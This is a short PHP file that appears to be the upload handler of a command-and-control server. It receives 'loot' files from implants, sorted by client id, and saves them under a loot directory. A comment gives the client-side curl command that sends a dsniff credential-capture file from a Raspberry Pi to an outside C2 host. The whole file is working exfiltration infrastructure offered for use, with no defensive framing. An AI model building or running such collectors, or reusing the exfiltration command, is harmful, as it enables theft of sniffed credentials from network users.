<?php

define( 'MASTERANDSERVANTS', true );

/*
 * client-side:
 *   curl --user "user:pass" \
 *        --form "id=1234567890" \
 *        --form "loot=@/home/pi/dsniff.txt" \
 *        https://comandandcontrol.dedyn.io/cnc/upload.php
 */

include_once( "cnf/config.inc.php" );

if( $_SERVER[ "REQUEST_METHOD" ] == "POST" ) {
  if( $_FILES[ "loot" ][ "type" ] === "text/plain" ) {
    if( ! filter_var( $_POST[ "id" ], FILTER_VALIDATE_FLOAT ) ) {
      die( "Error 003\n" );
    }
    $dir = $config[ "lootdir" ] . $_POST[ "id" ];
    if( ! is_dir( $dir ) ) {
      if( ! mkdir( $dir, 0755 ) ) {
        die( "Error 004\n" );
      }
    }
    $target = $dir . "/" . date( "YmdHis" ) . ".txt";
    if( ! move_uploaded_file( $_FILES[ "loot" ][ "tmp_name" ], $target ) ) {
      die( "Error 005\n" );
    }
  } else die( "Error 002\n" );
} else die( "Error 001\n" );
?>
